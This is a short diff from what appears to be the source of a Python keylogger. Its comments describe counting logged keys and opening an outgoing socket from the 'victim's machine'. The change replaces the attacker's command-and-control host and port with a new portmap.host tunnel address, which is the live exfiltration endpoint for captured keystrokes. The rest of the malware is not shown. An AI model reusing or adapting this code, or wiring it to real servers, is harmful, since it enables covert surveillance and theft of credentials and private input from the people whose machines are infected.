@@ -19,8 +19,8 @@ count=0 # to store count of keys logged
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine
 
-host="NsPapa-60397.portmap.host"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
-port=60397  # it will store port number on which server is listening
+host="NsPapa-45105.portmap.host"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
+port=45105  # it will store port number on which server is listening
 #host="192.168.1.11"
 #port=9999
 
